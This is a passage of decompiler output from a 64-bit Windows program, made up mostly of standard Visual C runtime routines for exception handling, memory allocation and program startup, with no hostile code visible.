  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  LVar2 = UnhandledExceptionFilter(&local_588);
  if ((LVar2 == 0) && (BVar1 == 0)) {
    FUN_14000c0e0();
  }
  hProcess = GetCurrentProcess();
  TerminateProcess(hProcess,0xc000000d);
  return;
}




void FUN_1400072d0(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined4 param_4,
                  undefined8 param_5)

{
  BOOL BVar1;
  LONG LVar2;
  code *pcVar3;
  HANDLE hProcess;
  _EXCEPTION_POINTERS local_588;
  EXCEPTION_RECORD local_578;
  _CONTEXT local_4d8;
  
  pcVar3 = (code *)FUN_14000b0e0(DAT_14001b610);
  if (pcVar3 == (code *)0x0) {
    FUN_14000c0e0();
    RtlCaptureContext(&local_4d8);
    FUN_140006070((ulonglong *)&local_578,0,0x98);
    local_578.ExceptionCode = 0xc000000d;
    local_588.ExceptionRecord = &local_578;
    local_588.ContextRecord = &local_4d8;
    BVar1 = IsDebuggerPresent();
    SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
    LVar2 = UnhandledExceptionFilter(&local_588);
    if ((LVar2 == 0) && (BVar1 == 0)) {
      FUN_14000c0e0();
    }
    hProcess = GetCurrentProcess();
    TerminateProcess(hProcess,0xc000000d);
  }
  else {
    (*pcVar3)(param_1,param_2,param_3,param_4,param_5);
  }
  return;
}




void FUN_1400073e0(void)

{
  BOOL BVar1;
  LONG LVar2;
  code *pcVar3;
  HANDLE hProcess;
  _EXCEPTION_POINTERS local_588;
  EXCEPTION_RECORD local_578;
  _CONTEXT local_4d8;
  
  pcVar3 = (code *)FUN_14000b0e0(DAT_14001b610);
  if (pcVar3 != (code *)0x0) {
    (*pcVar3)(0,0,0,0,0);
    return;
  }
  FUN_14000c0e0();
  RtlCaptureContext(&local_4d8);
  FUN_140006070((ulonglong *)&local_578,0,0x98);
  local_578.ExceptionCode = 0xc000000d;
  local_588.ExceptionRecord = &local_578;
  local_588.ContextRecord = &local_4d8;
  BVar1 = IsDebuggerPresent();
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  LVar2 = UnhandledExceptionFilter(&local_588);
  if ((LVar2 == 0) && (BVar1 == 0)) {
    FUN_14000c0e0();
  }
  hProcess = GetCurrentProcess();
  TerminateProcess(hProcess,0xc000000d);
  return;
}




longlong * FUN_1400074d0(longlong *param_1,DWORD64 *param_2,longlong param_3,longlong *param_4)

{
  int iVar1;
  int iVar2;
  PRUNTIME_FUNCTION p_Var3;
  int *piVar4;
  uint uVar5;
  ulonglong uVar6;
  longlong lVar7;
  longlong lVar8;
  uint uVar9;
  ulonglong uVar10;
  ulonglong local_res8;
  
  iVar1 = *(int *)(param_3 + 0xc);
  uVar10 = (ulonglong)iVar1;
  iVar2 = FUN_14000c180(param_3,(longlong *)param_2);
  *param_4 = *param_1;
  if (iVar1 == 0) {
    return param_4;
  }
  lVar8 = uVar10 * 0x14;
  do {
    lVar8 = lVar8 + -0x14;
    lVar7 = (longlong)*(int *)(param_3 + 0x10) + param_2[1] + lVar8;
    if ((*(int *)(lVar7 + 4) < iVar2) && (iVar2 <= *(int *)(lVar7 + 8))) {
      p_Var3 = RtlLookupFunctionEntry(*param_2,&local_res8,(PUNWIND_HISTORY_TABLE)0x0);
      uVar9 = *(uint *)(lVar7 + 0xc);
      lVar7 = (longlong)*(int *)(lVar7 + 0x10) + local_res8;
      uVar6 = 0;
      if (uVar9 != 0) {
        piVar4 = (int *)(lVar7 + 0xc);
        do {
          if ((longlong)*piVar4 == (ulonglong)p_Var3->BeginAddress) break;
          uVar5 = (int)uVar6 + 1;
          uVar6 = (ulonglong)uVar5;
          piVar4 = piVar4 + 5;
        } while (uVar5 < uVar9);
      }
      if ((uint)uVar6 < uVar9) {
        *param_4 = *(longlong *)((longlong)*(int *)(lVar7 + 0x10 + uVar6 * 0x14) + *param_1);
        return param_4;
      }
    }
    uVar9 = (int)uVar10 - 1;
    uVar10 = (ulonglong)uVar9;
    if (uVar9 == 0) {
      return param_4;
    }
  } while( true );
}




undefined8 FUN_1400075e0(void)

{
  DWORD *pDVar1;
  
  pDVar1 = FUN_14000b3d0();
  return *(undefined8 *)(pDVar1 + 0x4a);
}




undefined8 FUN_140007600(void)

{
  DWORD *pDVar1;
  
  pDVar1 = FUN_14000b3d0();
  return *(undefined8 *)(pDVar1 + 0x4c);
}




void FUN_140007620(undefined8 param_1)

{
  DWORD *pDVar1;
  
  pDVar1 = FUN_14000b3d0();
  *(undefined8 *)(pDVar1 + 0x4a) = param_1;
  return;
}




void FUN_140007640(undefined8 param_1)

{
  DWORD *pDVar1;
  
  pDVar1 = FUN_14000b3d0();
  *(undefined8 *)(pDVar1 + 0x4c) = param_1;
  return;
}




void FUN_140007660(longlong *param_1,DWORD64 *param_2,longlong param_3)

{
  int iVar1;
  int iVar2;
  PRUNTIME_FUNCTION p_Var3;
  DWORD *pDVar4;
  int *piVar5;
  uint uVar6;
  ulonglong uVar7;
  longlong lVar8;
  longlong lVar9;
  uint uVar10;
  ulonglong uVar11;
  longlong local_res8;
  ulonglong local_res18;
  
  iVar2 = *(int *)(param_3 + 0xc);
  uVar11 = (ulonglong)iVar2;
  iVar1 = FUN_14000c180(param_3,(longlong *)param_2);
  local_res8 = *param_1;
  if (iVar2 != 0) {
    lVar9 = uVar11 * 0x14;
    do {
      lVar9 = lVar9 + -0x14;
      lVar8 = (longlong)*(int *)(param_3 + 0x10) + param_2[1] + lVar9;
      if ((*(int *)(lVar8 + 4) < iVar1) && (iVar1 <= *(int *)(lVar8 + 8))) {
        p_Var3 = RtlLookupFunctionEntry(*param_2,&local_res18,(PUNWIND_HISTORY_TABLE)0x0);
        uVar10 = *(uint *)(lVar8 + 0xc);
        lVar8 = (longlong)*(int *)(lVar8 + 0x10) + local_res18;
        uVar7 = 0;
        if (uVar10 != 0) {
          piVar5 = (int *)(lVar8 + 0xc);
          do {
            if ((longlong)*piVar5 == (ulonglong)p_Var3->BeginAddress) break;
            uVar6 = (int)uVar7 + 1;
            uVar7 = (ulonglong)uVar6;
            piVar5 = piVar5 + 5;
          } while (uVar6 < uVar10);
        }
        if ((uint)uVar7 < uVar10) {
          local_res8 = *(longlong *)((longlong)*(int *)(lVar8 + 0x10 + uVar7 * 0x14) + *param_1);
          break;
        }
      }
      uVar10 = (int)uVar11 - 1;
      uVar11 = (ulonglong)uVar10;
    } while (uVar10 != 0);
  }
  iVar2 = FUN_14000c180(param_3,(longlong *)param_2);
  uVar11 = (ulonglong)*(int *)(param_3 + 0xc);
  if (*(int *)(param_3 + 0xc) != 0) {
    lVar9 = uVar11 * 0x14;
    do {
      lVar9 = lVar9 + -0x14;
      pDVar4 = FUN_14000b3d0();
      lVar8 = *(longlong *)(pDVar4 + 0x4a) + (longlong)*(int *)(param_3 + 0x10);
      if ((*(int *)(lVar8 + 4 + lVar9) < iVar2) && (iVar2 <= *(int *)(lVar8 + 8 + lVar9))) {
        iVar2 = *(int *)(lVar8 + 4 + lVar9);
        goto LAB_14000777c;
      }
      uVar10 = (int)uVar11 - 1;
      uVar11 = (ulonglong)uVar10;
    } while (uVar10 != 0);
  }
  iVar2 = -1;
LAB_14000777c:
  FUN_14000c3d0(&local_res8,(longlong *)param_2,param_3,iVar2);
  return;
}




/* Library Function - Multiple Matches With Different Base Names
    __CxxFrameHandler
    __CxxFrameHandler3
   
   Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release */

void FID_conflict___CxxFrameHandler
               (int *param_1,__uint64 param_2,ULONG_PTR param_3,_xDISPATCHER_CONTEXT *param_4)

{
  DWORD *pDVar1;
  __uint64 local_res8;
  
  local_res8 = param_2;
  pDVar1 = FUN_14000b3d0();
  *(undefined8 *)(pDVar1 + 0x4a) = *(undefined8 *)(param_4 + 8);
  pDVar1 = FUN_14000b3d0();
  *(undefined8 *)(pDVar1 + 0x4c) = *(undefined8 *)(param_1 + 0xe);
  pDVar1 = FUN_14000b3d0();
  FUN_14000d8d0(param_1,&local_res8,param_3,param_4,
                (_s_FuncInfo *)
                ((ulonglong)**(uint **)(param_4 + 0x38) + *(longlong *)(pDVar1 + 0x4a)),0,0,0);
  return;
}




/* Library Function - Single Match
    int __cdecl __SehTransFilter(struct _EXCEPTION_POINTERS * __ptr64,struct EHExceptionRecord *
   __ptr64,unsigned __int64 * __ptr64,struct _CONTEXT * __ptr64,struct _xDISPATCHER_CONTEXT *
   __ptr64,struct _s_FuncInfo const * __ptr64,int * __ptr64)
   
   Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release */

int __cdecl
__SehTransFilter(_EXCEPTION_POINTERS *param_1,EHExceptionRecord *param_2,__uint64 *param_3,
                _CONTEXT *param_4,_xDISPATCHER_CONTEXT *param_5,_s_FuncInfo *param_6,int *param_7)

{
  PEXCEPTION_RECORD pEVar1;
  DWORD *pDVar2;
  
  pDVar2 = FUN_14000b3d0();
  *(EHExceptionRecord **)(pDVar2 + 0x4e) = param_2;
  pEVar1 = param_1->ExceptionRecord;
  pDVar2 = FUN_14000b3d0();
  *(ULONG_PTR *)(pDVar2 + 0x4c) = pEVar1->ExceptionInformation[3];
  FUN_14000d8d0((int *)param_1->ExceptionRecord,param_3,(ULONG_PTR)param_4,param_5,param_6,0,0,1);
  pDVar2 = FUN_14000b3d0();
  pDVar2[0x4e] = 0;
  pDVar2[0x4f] = 0;
  *param_7 = 1;
  return 1;
}




undefined4 FUN_1400078f0(undefined4 *param_1,undefined8 param_2,undefined8 param_3)

{
  DWORD *pDVar1;
  undefined4 *local_20;
  undefined8 local_18;
  
  local_20 = param_1;
  local_18 = param_3;
  pDVar1 = FUN_14000b3d0();
  (**(code **)(pDVar1 + 0x38))(*param_1,&local_20);
  return 0;
}




/* Library Function - Single Match
    _CallSETranslator$filt$0
   
   Library: Visual Studio 2005 Release */

void _CallSETranslator_filt_0(_EXCEPTION_POINTERS *param_1,longlong param_2)

{
  __SehTransFilter(param_1,*(EHExceptionRecord **)(param_2 + 0x70),*(__uint64 **)(param_2 + 0x78),
                   *(_CONTEXT **)(param_2 + 0x80),*(_xDISPATCHER_CONTEXT **)(param_2 + 0x88),
                   *(_s_FuncInfo **)(param_2 + 0x90),(int *)(param_2 + 0x40));
  return;
}




longlong FUN_1400079a0(undefined8 param_1,longlong param_2,undefined8 param_3,int param_4,
                      uint *param_5,int *param_6,longlong *param_7)

{
  uint uVar1;
  int iVar2;
  int *piVar3;
  longlong lVar4;
  uint uVar5;
  longlong lVar6;
  
  uVar1 = *(uint *)(param_2 + 0xc);
  lVar4 = 0;
  iVar2 = FUN_14000c180(param_2,param_7);
  if (uVar1 == 0) {
    FUN_14000db20();
  }
  *param_6 = -1;
  *param_5 = 0xffffffff;
  uVar5 = uVar1;
  if (uVar1 != 0) {
    piVar3 = (int *)((longlong)*(int *)(param_2 + 0x10) + (longlong)(int)uVar1 * 0x14 + -0xc +
                    param_7[1]);
    do {
      if ((piVar3[-1] < iVar2) && (iVar2 <= *piVar3)) break;
      piVar3 = piVar3 + -5;
      uVar5 = uVar5 - 1;
    } while (uVar5 != 0);
  }
  if (uVar5 != 0) {
    lVar4 = (longlong)*(int *)(param_2 + 0x10) + (ulonglong)(uVar5 - 1) * 0x14 + param_7[1];
  }
  uVar5 = 0;
  if (uVar1 != 0) {
    lVar6 = 0;
    do {
      piVar3 = (int *)((longlong)*(int *)(param_2 + 0x10) + param_7[1] + lVar6);
      if ((((lVar4 == 0) || ((*(int *)(lVar4 + 4) < *piVar3 && (piVar3[1] <= *(int *)(lVar4 + 8)))))
          && (*piVar3 <= param_4)) && (param_4 <= piVar3[1])) {
        if (*param_5 == 0xffffffff) {
          *param_5 = uVar5;
        }
        *param_6 = uVar5 + 1;
      }
      uVar5 = uVar5 + 1;
      lVar6 = lVar6 + 0x14;
    } while (uVar5 < uVar1);
    if (*param_5 != 0xffffffff) {
      return (longlong)*(int *)(param_2 + 0x10) + (ulonglong)*param_5 * 0x14 + param_7[1];
    }
  }
  *param_5 = 0;
  *param_6 = 0;
  return 0;
}




/* Library Function - Single Match
    _CreateFrameInfo
   
   Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release,
   Visual Studio 2012 Release */

undefined8 * _CreateFrameInfo(undefined8 *param_1,undefined8 param_2)

{
  DWORD *pDVar1;
  undefined8 uVar2;
  
  *param_1 = param_2;
  pDVar1 = FUN_14000b3d0();
  if (param_1 < *(undefined8 **)(pDVar1 + 0x48)) {
    pDVar1 = FUN_14000b3d0();
    uVar2 = *(undefined8 *)(pDVar1 + 0x48);
  }
  else {
    uVar2 = 0;
  }
  param_1[1] = uVar2;
  pDVar1 = FUN_14000b3d0();
  *(undefined8 **)(pDVar1 + 0x48) = param_1;
  return param_1;
}




/* Library Function - Single Match
    _IsExceptionObjectToBeDestroyed
   
   Library: Visual Studio 2005 Release */

undefined8 _IsExceptionObjectToBeDestroyed(longlong param_1)

{
  longlong *plVar1;
  DWORD *pDVar2;
  
  pDVar2 = FUN_14000b3d0();
  plVar1 = *(longlong **)(pDVar2 + 0x48);
  while( true ) {
    if (plVar1 == (longlong *)0x0) {
      return 1;
    }
    if (*plVar1 == param_1) break;
    plVar1 = (longlong *)plVar1[1];
  }
  return 0;
}




void FUN_140007b80(longlong param_1)

{
  longlong lVar1;
  DWORD *pDVar2;
  
  pDVar2 = FUN_14000b3d0();
  if (param_1 != *(longlong *)(pDVar2 + 0x48)) {
    FUN_14000db20();
  }
  pDVar2 = FUN_14000b3d0();
  lVar1 = *(longlong *)(pDVar2 + 0x48);
  while( true ) {
    if (lVar1 == 0) {
      FUN_14000db20();
      return;
    }
    if (param_1 == lVar1) break;
    lVar1 = *(longlong *)(lVar1 + 8);
  }
  pDVar2 = FUN_14000b3d0();
  *(undefined8 *)(pDVar2 + 0x48) = *(undefined8 *)(lVar1 + 8);
  return;
}




/* Library Function - Single Match
    _UnwindNestedFrames
   
   Library: Visual Studio 2008 Release */

void _UnwindNestedFrames(undefined8 *param_1,ULONG_PTR param_2,ULONG_PTR param_3,ULONG_PTR param_4,
                        ULONG_PTR param_5,int param_6,ULONG_PTR param_7,undefined8 *param_8,
                        byte param_9)

{
  EXCEPTION_RECORD local_578;
  _CONTEXT local_4d8;
  
  memcpy(&local_578,&DAT_140015a80,0x98);
  local_578.ExceptionInformation[2] = param_5;
  local_578.ExceptionInformation[3] = (ULONG_PTR)param_6;
  local_578.ExceptionInformation[5] = param_7;
  local_578.ExceptionInformation[7] = (ULONG_PTR)param_9;
  local_578.ExceptionInformation[0] = (ULONG_PTR)&LAB_14000c9f0;
  local_578.ExceptionInformation[8] = 0x19930520;
  local_578.ExceptionInformation[1] = param_4;
  local_578.ExceptionInformation[4] = param_3;
  local_578.ExceptionInformation[6] = param_2;
  RtlUnwindEx((PVOID)*param_1,(PVOID)*param_8,&local_578,(PVOID)0x0,&local_4d8,
              (PUNWIND_HISTORY_TABLE)param_8[8]);
  return;
}




/* Library Function - Single Match
    _CxxThrowException
   
   Library: Visual Studio 2005 Release */

void __stdcall _CxxThrowException(void *pExceptionObject,ThrowInfo *pThrowInfo)

{
  PVOID local_res8 [4];
  ULONG_PTR local_28;
  void *local_20;
  ThrowInfo *local_18;
  PVOID local_10;
  
  local_28 = 0x19930520;
  local_10 = (PVOID)0x0;
  local_20 = pExceptionObject;
  local_18 = pThrowInfo;
  local_res8[0] = RtlPcToFileHeader(pThrowInfo,local_res8);
  if (pThrowInfo != (ThrowInfo *)0x0) {
    if ((pThrowInfo->attributes & 8) == 0) {
      if (local_res8[0] == (PVOID)0x0) {
        local_28._0_4_ = 0x1994000;
      }
    }
    else {
      local_28 = CONCAT44(local_28._4_4_,0x1994000);
    }
  }
  local_10 = local_res8[0];
  RaiseException(0xe06d7363,1,4,&local_28);
  return;
}




undefined8 * FUN_140007db0(undefined8 *param_1,uint param_2)

{
  *param_1 = type_info::vftable;
  FID_conflict__Type_info_dtor((longlong)param_1);
  if ((param_2 & 1) != 0) {
    thunk_FUN_14000b9c0(param_1);
  }
  return param_1;
}




/* Library Function - Single Match
    public: bool __cdecl type_info::operator==(class type_info const & __ptr64)const __ptr64
   
   Library: Visual Studio 2005 Release */

bool __thiscall type_info::operator==(type_info *this,type_info *param_1)

{
  type_info tVar1;
  type_info tVar2;
  longlong lVar3;
  type_info *ptVar4;
  
  ptVar4 = param_1 + 0x11;
  lVar3 = 0x11 - (longlong)ptVar4;
  do {
    tVar1 = *ptVar4;
    tVar2 = ptVar4[(longlong)(this + lVar3)];
    if (tVar1 != tVar2) break;
    ptVar4 = ptVar4 + 1;
  } while (tVar2 != (type_info)0x0);
  return tVar1 == tVar2;
}




undefined8 * FUN_140007e20(undefined8 *param_1)

{
  *param_1 = std::exception::vftable;
  param_1[1] = 0;
  *(undefined4 *)(param_1 + 2) = 0;
  return param_1;
}




undefined8 * FUN_140007e40(undefined8 *param_1,undefined8 *param_2)

{
  char cVar1;
  char *pcVar2;
  ulonglong uVar3;
  
  *param_1 = std::exception::vftable;
  if ((char *)*param_2 == (char *)0x0) {
    param_1[1] = 0;
    *(undefined4 *)(param_1 + 2) = 1;
    return param_1;
  }
  uVar3 = 0xffffffffffffffff;
  pcVar2 = (char *)*param_2;
  do {
    if (uVar3 == 0) break;
    uVar3 = uVar3 - 1;
    cVar1 = *pcVar2;
    pcVar2 = pcVar2 + 1;
  } while (cVar1 != '\0');
  pcVar2 = (char *)FUN_14000dc10(~uVar3);
  param_1[1] = pcVar2;
  if (pcVar2 != (char *)0x0) {
    strcpy_s(pcVar2,~uVar3,(char *)*param_2);
  }
  *(undefined4 *)(param_1 + 2) = 1;
  return param_1;
}




/* Library Function - Single Match
    public: __cdecl std::exception::exception(char const * __ptr64 const & __ptr64,int) __ptr64
   
   Library: Visual Studio 2005 Release */

exception * __thiscall std::exception::exception(exception *this,char **param_1,int param_2)

{
  char *pcVar1;
  
  *(undefined ***)this = vftable;
  pcVar1 = *param_1;
  *(undefined4 *)(this + 0x10) = 0;
  *(char **)(this + 8) = pcVar1;
  return this;
}




undefined8 * FUN_140007ef0(undefined8 *param_1,longlong param_2)

{
  char cVar1;
  int iVar2;
  char *pcVar3;
  ulonglong uVar4;
  
  *param_1 = std::exception::vftable;
  iVar2 = *(int *)(param_2 + 0x10);
  *(int *)(param_1 + 2) = iVar2;
  if (iVar2 == 0) {
    param_1[1] = *(undefined8 *)(param_2 + 8);
    return param_1;
  }
  if (*(char **)(param_2 + 8) == (char *)0x0) {
    param_1[1] = 0;
    return param_1;
  }
  uVar4 = 0xffffffffffffffff;
  pcVar3 = *(char **)(param_2 + 8);
  do {
    if (uVar4 == 0) break;
    uVar4 = uVar4 - 1;
    cVar1 = *pcVar3;
    pcVar3 = pcVar3 + 1;
  } while (cVar1 != '\0');
  pcVar3 = (char *)FUN_14000dc10(~uVar4);
  param_1[1] = pcVar3;
  if (pcVar3 != (char *)0x0) {
    strcpy_s(pcVar3,~uVar4,*(char **)(param_2 + 8));
  }
  return param_1;
}




void FUN_140007fa0(undefined8 *param_1)

{
  *param_1 = std::exception::vftable;
  if (*(int *)(param_1 + 2) != 0) {
    FUN_14000b9c0((LPVOID)param_1[1]);
  }
  return;
}




char * FUN_140007fd0(longlong param_1)

{
  char *pcVar1;
  
  pcVar1 = *(char **)(param_1 + 8);
  if (pcVar1 == (char *)0x0) {
    pcVar1 = "Unknown exception";
  }
  return pcVar1;
}




undefined8 * FUN_140007ff0(undefined8 *param_1,uint param_2)

{
  *param_1 = std::exception::vftable;
  if (*(int *)(param_1 + 2) != 0) {
    FUN_14000b9c0((LPVOID)param_1[1]);
  }
  if ((param_2 & 1) != 0) {
    thunk_FUN_14000b9c0(param_1);
  }
  return param_1;
}




/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* Library Function - Single Match
    void * __ptr64 __cdecl operator new(unsigned __int64)
   
   Library: Visual Studio 2005 Release */

void * __cdecl operator_new(__uint64 param_1)

{
  int iVar1;
  LPVOID pvVar2;
  undefined **local_28 [4];
  
  pvVar2 = FUN_14000dc10(param_1);
  while( true ) {
    if (pvVar2 != (LPVOID)0x0) {
      return pvVar2;
    }
    iVar1 = _callnewh(param_1);
    if (iVar1 == 0) break;
    pvVar2 = FUN_14000dc10(param_1);
  }
  if ((DAT_14001b630 & 1) == 0) {
    DAT_14001b630 = DAT_14001b630 | 1;
    std::exception::exception((exception *)&DAT_14001b618,&PTR_s_bad_allocation_14001a0f8,1);
    _DAT_14001b618 = std::bad_alloc::vftable;
    FUN_14000de60(0x140014c40);
  }
  FUN_140007ef0(local_28,0x14001b618);
  local_28[0] = std::bad_alloc::vftable;
                    /* WARNING: Subroutine does not return */
  _CxxThrowException(local_28,(ThrowInfo *)&DAT_1400193e8);
}




undefined8 FUN_1400080e0(ulonglong *param_1,ulonglong param_2,void *param_3,ulonglong param_4)

{
  DWORD *pDVar1;
  
  if (param_4 == 0) {
    return 0;
  }
  if (param_1 != (ulonglong *)0x0) {
    if ((param_3 != (void *)0x0) && (param_4 <= param_2)) {
      memcpy(param_1,param_3,param_4);
      return 0;
    }
    FUN_140006070(param_1,0,param_2);
    if (param_3 != (void *)0x0) {
      if (param_4 <= param_2) {
        return 0x16;
      }
      pDVar1 = FUN_140009c00();
      *pDVar1 = 0x22;
      FUN_1400072d0(0,0,0,0,0);
      return 0x22;
    }
  }
  pDVar1 = FUN_140009c00();
  *pDVar1 = 0x16;
  FUN_1400072d0(0,0,0,0,0);
  return 0x16;
}




/* Library Function - Single Match
    memmove_s
   
   Library: Visual Studio 2005 Release */

errno_t __cdecl memmove_s(void *_Dst,rsize_t _DstSize,void *_Src,rsize_t _MaxCount)

{
  DWORD *pDVar1;
  
  if (_MaxCount != 0) {
    if ((_Dst == (void *)0x0) || (_Src == (void *)0x0)) {
      pDVar1 = FUN_140009c00();
      *pDVar1 = 0x16;
      FUN_1400072d0(0,0,0,0,0);
      return 0x16;
    }
    if (_DstSize < _MaxCount) {
      pDVar1 = FUN_140009c00();
      *pDVar1 = 0x22;
      FUN_1400072d0(0,0,0,0,0);
      return 0x22;
    }
    memcpy(_Dst,_Src,_MaxCount);
  }
  return 0;
}




/* WARNING: Removing unreachable block (ram,0x0001400083a2) */
/* WARNING: Removing unreachable block (ram,0x000140008383) */
/* WARNING: Removing unreachable block (ram,0x00014000836f) */
/* WARNING: Removing unreachable block (ram,0x00014000835c) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

uint FUN_140008240(void)

{
  DWORD DVar1;
  DWORD DVar2;
  DWORD DVar3;
  BOOL BVar4;
  int iVar5;
  HANDLE pvVar6;
  LPOSVERSIONINFOA lpVersionInformation;
  undefined8 uVar7;
  byte *pbVar8;
  uint uVar9;
  ulonglong uVar10;
  _STARTUPINFOA local_88;
  
  GetStartupInfoA(&local_88);
  pvVar6 = GetProcessHeap();
  lpVersionInformation = (LPOSVERSIONINFOA)HeapAlloc(pvVar6,0,0x94);
  if (lpVersionInformation == (LPOSVERSIONINFOA)0x0) {
    if (DAT_14001b648 == 1) {
      FUN_14000e5b0();
    }
    FUN_14000e370(0x12);
    FUN_14000df70(0xff);
    uVar9 = 0xff;
  }
  else {
    lpVersionInformation->dwOSVersionInfoSize = 0x94;
    BVar4 = GetVersionExA(lpVersionInformation);
    if (BVar4 == 0) {
      pvVar6 = GetProcessHeap();
      HeapFree(pvVar6,0,lpVersionInformation);
      uVar9 = 0xff;
    }
    else {
      DVar1 = lpVersionInformation->dwPlatformId;
      DVar2 = lpVersionInformation->dwMajorVersion;
      DVar3 = lpVersionInformation->dwMinorVersion;
      uVar9 = lpVersionInformation->dwBuildNumber & 0x7fff;
      pvVar6 = GetProcessHeap();
      HeapFree(pvVar6,0,lpVersionInformation);
      if (DVar1 != 2) {
        uVar9 = uVar9 | 0x8000;
      }
      _DAT_14001bc54 = DVar2 * 0x100 + DVar3;
      DAT_14001bc4c = DVar1;
      _DAT_14001bc50 = uVar9;
      DAT_14001bc58 = DVar2;
      _DAT_14001bc5c = DVar3;
      iVar5 = _heap_init();
      if (iVar5 == 0) {
        if (DAT_14001b648 == 1) {
          FUN_14000e5b0();
        }
        FUN_14000e370(0x1c);
        FUN_14000df70(0xff);
      }
      uVar7 = FUN_14000b5e0();
      if ((int)uVar7 == 0) {
        if (DAT_14001b648 == 1) {
          FUN_14000e5b0();
        }
        FUN_14000e370(0x10);
        FUN_14000df70(0xff);
      }
      FUN_14000f2f0();
      uVar7 = FUN_14000efc0();
      if ((int)uVar7 < 0) {
        _amsg_exit(0x1b);
      }
      DAT_14001d728 = GetCommandLineA();
      DAT_14001b638 = FUN_14000edf0();
      uVar7 = FUN_14000ece0();
      if ((int)uVar7 < 0) {
        _amsg_exit(8);
      }
      uVar7 = FUN_14000e950();
      if ((int)uVar7 < 0) {
        _amsg_exit(9);
      }
      uVar7 = FUN_14000e0b0(1);
      if ((int)uVar7 != 0) {
        _amsg_exit((int)uVar7);
      }
      pbVar8 = FUN_14000e8c0();
      if (((byte)local_88.dwFlags & 1) == 0) {
        uVar10 = 10;
      }
      else {
        uVar10 = (ulonglong)local_88.wShowWindow;
      }
      uVar9 = FUN_140002980(&IMAGE_DOS_HEADER_140000000,0,(char *)pbVar8,uVar10);
      FUN_14000e2c0(uVar9);
      FUN_14000e2e0();
    }
  }
  return uVar9;
}




void FUN_140008500(undefined8 *param_1)

{
  FUN_14000e6b0(*(int *)*param_1,param_1);
  return;
}




void entry(void)

{
  FUN_14000f3d0();
  FUN_140008240();
  return;
}




/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* Library Function - Single Match
    __report_gsfailure
   
   Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2010 Debug, Visual
   Studio 2010 Release */

void __cdecl __report_gsfailure(uintptr_t _StackCookie)

{
  HANDLE hProcess;
  DWORD64 unaff_retaddr;
  uintptr_t local_res8 [4];
  PVOID local_48;
  ulonglong local_40;
  PRUNTIME_FUNCTION local_38;
  DWORD64 local_30;
  DWORD64 local_28;
  undefined8 local_20;
  undefined8 local_18;
  
  local_res8[0] = _StackCookie;
  RtlCaptureContext(&DAT_14001b6f0);
  local_30 = DAT_14001b7e8;
  local_38 = RtlLookupFunctionEntry(DAT_14001b7e8,&local_28,(PUNWIND_HISTORY_TABLE)0x0);
  if (local_38 == (PRUNTIME_FUNCTION)0x0) {
    _DAT_14001b788 = local_res8;
    DAT_14001b7e8 = unaff_retaddr;
  }
  else {
    RtlVirtualUnwind(0,local_28,local_30,local_38,(PCONTEXT)&DAT_14001b6f0,&local_48,&local_40,
                     (PKNONVOLATILE_CONTEXT_POINTERS)0x0);
  }
  _DAT_14001b660 = DAT_14001b7e8;
  _DAT_14001b770 = local_res8[0];
  _DAT_14001b650 = 0xc0000409;
  _DAT_14001b654 = 1;
  local_20 = DAT_14001a0b0;
  local_18 = DAT_14001a0b8;
  DAT_14001b6e8 = IsDebuggerPresent();
  FUN_14000c0e0();
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  UnhandledExceptionFilter((_EXCEPTION_POINTERS *)&PTR_DAT_140015ba0);
  if (DAT_14001b6e8 == 0) {
    FUN_14000c0e0();
  }
  hProcess = GetCurrentProcess();
  TerminateProcess(hProcess,0xc0000409);
  return;
}




undefined8
FUN_140008690(PEXCEPTION_RECORD param_1,PVOID param_2,undefined8 param_3,longlong *param_4)

{
  uint uVar1;
  longlong lVar2;
  uint *puVar3;
  int iVar4;
  BOOL BVar5;
  ulonglong uVar6;
  uint *puVar7;
  ulonglong uVar8;
  ulonglong uVar9;
  uint uVar10;
  PEXCEPTION_RECORD local_38;
  undefined8 local_30;
  
  lVar2 = param_4[1];
  puVar3 = (uint *)param_4[7];
  uVar8 = *param_4 - lVar2;
  uVar10 = 0;
  if ((param_1->ExceptionFlags & 0x66) == 0) {
    if (*puVar3 != 0) {
      puVar7 = puVar3 + 3;
      local_38 = param_1;
      local_30 = param_3;
      do {
        if (((puVar7[-2] <= uVar8) && (uVar8 < puVar7[-1])) && (puVar7[1] != 0)) {
          if (*puVar7 != 1) {
            iVar4 = (*(code *)((ulonglong)*puVar7 + lVar2))(&local_38,param_2);
            if (iVar4 < 0) {
              return 0;
            }
            if (iVar4 < 1) goto LAB_1400087a3;
          }
          if ((param_1->ExceptionCode == 0xe06d7363) &&
             (BVar5 = _IsNonwritableInCurrentImage((PBYTE)&PTR___DestructExceptionObject_140015d20),
             BVar5 != 0)) {
            __DestructExceptionObject((int *)param_1);
          }
          FUN_14000f4d0();
          RtlUnwindEx(param_2,(PVOID)((ulonglong)puVar7[1] + lVar2),param_1,
                      (PVOID)(longlong)(int)param_1->ExceptionCode,(PCONTEXT)param_4[5],
                      (PUNWIND_HISTORY_TABLE)param_4[8]);
          FUN_14000f500();
        }
LAB_1400087a3:
        uVar10 = uVar10 + 1;
        puVar7 = puVar7 + 4;
      } while (uVar10 < *puVar3);
    }
  }
  else {
    uVar9 = param_4[4] - lVar2;
    puVar7 = puVar3;
    if (*puVar3 != 0) {
      do {
        if ((puVar7[1] <= uVar8) && (uVar6 = (ulonglong)puVar7[2], uVar8 < uVar6)) {
          if ((puVar7[1] <= uVar9) && ((uVar9 <= uVar6 && ((param_1->ExceptionFlags & 0x20) != 0))))
          {
            return 1;
          }
          uVar1 = puVar7[4];
          if (uVar1 == 0) {
            *param_4 = uVar6 + lVar2;
            (*(code *)((ulonglong)puVar7[3] + lVar2))(1,param_2);
          }
          else if (uVar9 == uVar1) {
            return 1;
          }
        }
        uVar10 = uVar10 + 1;
        puVar7 = puVar7 + 4;
